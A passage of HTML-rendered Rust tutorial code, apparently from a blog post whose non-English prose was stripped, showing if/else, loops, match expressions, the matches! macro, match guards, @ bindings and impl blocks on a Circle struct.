href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>goif for</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// kotlin</span>\n<span class=\"token keyword\">let</span> condition <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> number <span class=\"token operator\">=</span> <span class=\"token keyword\">if</span> condition <span class=\"token punctuation\">{</span>\n        <span class=\"token number\">5</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token number\">6</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">let</span> n <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> <span class=\"token number\">4</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is divisible by 4\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> <span class=\"token number\">3</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is divisible by 3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is divisible by 2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is not divisible by 4, 3, or 2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// for</span>\n<span class=\"token comment\">// kt, </span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token number\">1</span><span class=\"token punctuation\">..=</span><span class=\"token number\">5</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{}\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// </span>\n<span class=\"token comment\">// container</span>\n<span class=\"token keyword\">for</span> item <span class=\"token keyword\">in</span> <span class=\"token operator\">&amp;</span>container <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">for</span> item <span class=\"token keyword\">in</span> <span class=\"token operator\">&amp;</span><span class=\"token keyword\">mut</span> collection <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// index</span>\n<span class=\"token keyword\">let</span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// `.iter()`  `a` </span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">.</span><span class=\"token function\">iter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">enumerate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{}{}\"</span><span class=\"token punctuation\">,</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">//  while(true)</span>\n<span class=\"token keyword\">loop</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"again!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>rustbreak</p>\n<p>loop</p>\n</blockquote>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><blockquote>\n<p>rust</p>\n</blockquote>\n<h3 id=\"match\"><a href=\"#match\" class=\"headerlink\" title=\"match\"></a>match</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// switch</span>\n<span class=\"token comment\">// matchswitch</span>\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Coin</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Penny</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Nickel</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Dime</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Quarter</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">value_in_cents</span><span class=\"token punctuation\">(</span>coin<span class=\"token punctuation\">:</span> <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">u8</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">match</span> coin <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Penny</span> <span class=\"token operator\">=&gt;</span>  <span class=\"token punctuation\">{</span>\n            <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Lucky penny!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token number\">1</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Nickel</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Dime</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Quarter</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">25</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// match</span>\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">IpAddr</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token class-name\">Ipv4</span><span class=\"token punctuation\">,</span>\n   <span class=\"token class-name\">Ipv6</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> ip1 <span class=\"token operator\">=</span> <span class=\"token class-name\">IpAddr</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Ipv6</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">let</span> ip_str <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span> ip1 <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">IpAddr</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Ipv4</span> <span class=\"token operator\">=&gt;</span> <span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span>\n        _ <span class=\"token operator\">=&gt;</span> <span class=\"token string\">\"::1\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{}\"</span><span class=\"token punctuation\">,</span> ip_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">//  </span>\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Coin</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Penny</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Nickel</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Dime</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Quarter</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UsState</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 25</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">value_in_cents</span><span class=\"token punctuation\">(</span>coin<span class=\"token punctuation\">:</span> <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">u8</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">match</span> coin <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Penny</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Nickel</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Dime</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span>\n        <span class=\"token comment\">// state</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Quarter</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"State quarter from {:?}!\"</span><span class=\"token punctuation\">,</span> state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token number\">25</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">//  match </span>\n<span class=\"token keyword\">let</span> v <span class=\"token operator\">=</span> <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">3u8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">match</span> v <span class=\"token punctuation\">{</span>\n   <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n   _ <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">if</span> <span class=\"token keyword\">let</span> <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>match_ =&gt;</p>\n</blockquote>\n<h3 id=\"matches-\"><a href=\"#matches-\" class=\"headerlink\" title=\"matches!\"></a>matches!</h3><blockquote>\n<p>javaString#matchesmacth,matches!</p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// match</span>\n<span class=\"token keyword\">let</span> foo <span class=\"token operator\">=</span> <span class=\"token char string\">'f'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> matched <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span> foo <span class=\"token punctuation\">{</span>\n    <span class=\"token char string\">'A'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'Z'</span> <span class=\"token operator\">|</span> <span class=\"token char string\">'a'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'z'</span> <span class=\"token operator\">=&gt;</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n    _ <span class=\"token operator\">=&gt;</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// matches!</span>\n<span class=\"token keyword\">let</span> foo <span class=\"token operator\">=</span> <span class=\"token char string\">'f'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> matched <span class=\"token operator\">=</span> <span class=\"token macro property\">matches!</span><span class=\"token punctuation\">(</span>foo<span class=\"token punctuation\">,</span> <span class=\"token char string\">'A'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'Z'</span> <span class=\"token operator\">|</span> <span class=\"token char string\">'a'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'z'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><blockquote>\n<p>if condition</p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">let</span> y <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">match</span> x <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Got 50\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> n <span class=\"token operator\">==</span> y <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Matched, n = {}\"</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        _ <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Default case, x = {:?}\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"at the end: x = {:?}, y = {}\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p><strong></strong></p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> y <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">match</span> x <span class=\"token punctuation\">{</span>\n    <span class=\"token number\">4</span> <span class=\"token operator\">|</span> <span class=\"token number\">5</span> <span class=\"token operator\">|</span> <span class=\"token number\">6</span> <span class=\"token keyword\">if</span> y <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    _ <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p> <code>if y</code>  <code>6</code> <code>if y</code>  <code>4</code><code>5</code> <strong></strong> <code>6</code>  <code>x</code>  <code>4 | 5 | 6</code>  <code>y</code>  <code>true</code></p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"@\"></a>@</h3><blockquote>\n<p></p>\n<p> </p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Message</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span> id<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">let</span> msg <span class=\"token operator\">=</span> <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span> id<span class=\"token punctuation\">:</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">match</span> msg <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span> id<span class=\"token punctuation\">:</span> id_variable <span class=\"token operator\">@</span> <span class=\"token number\">3</span><span class=\"token punctuation\">..=</span><span class=\"token number\">7</span> <span class=\"token punctuation\">}</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found an id in range: {}\"</span><span class=\"token punctuation\">,</span> id_variable<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span> id<span class=\"token punctuation\">:</span> <span class=\"token number\">10</span><span class=\"token punctuation\">..=</span><span class=\"token number\">12</span> <span class=\"token punctuation\">}</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found an id in another range\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span> id <span class=\"token punctuation\">}</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found some other id: {}\"</span><span class=\"token punctuation\">,</span> id<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>id: 3..=7</p>\n<p>:</p>\n<blockquote>\n<p>:</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">match</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">{</span>\n        num <span class=\"token operator\">@</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token number\">2</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{}\"</span><span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        _ <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p> <code>num</code>  <code>1</code></p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\">num <span class=\"token operator\">@</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p> Rust 1.53 </p>\n</blockquote>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>Rust<code>impl</code></p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// newCircleself</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">new</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n            x<span class=\"token punctuation\">:</span> x<span class=\"token punctuation\">,</span>\n            y<span class=\"token punctuation\">:</span> y<span class=\"token punctuation\">,</span>\n            radius<span class=\"token punctuation\">:</span> radius<span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// Circle&amp;selfCircle</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">area</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">f64</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token keyword\">f64</span><span class=\"token punctuation\">::</span><span class=\"token namespace\">consts<span class=\"token punctuation\">::</span></span><span class=\"token constant\">PI</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius <span class=\"token operator\">*</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>javajavastructimpl</p>\n<p>impl</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">new</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n            x<span class=\"token punctuation\">:</span> x<span class=\"token punctuation\">,</span>\n            y<span class=\"token punctuation\">:</span> y<span class=\"token punctuation\">,</span>\n            radius<span class=\"token punctuation\">:</span> radius<span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">area</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">f64</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token keyword\">f64</span><span class=\"token punctuation\">::</span><span class=\"token namespace\">consts<span class=\"token punctuation\">::</span></span><span class=\"token constant\">PI</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token 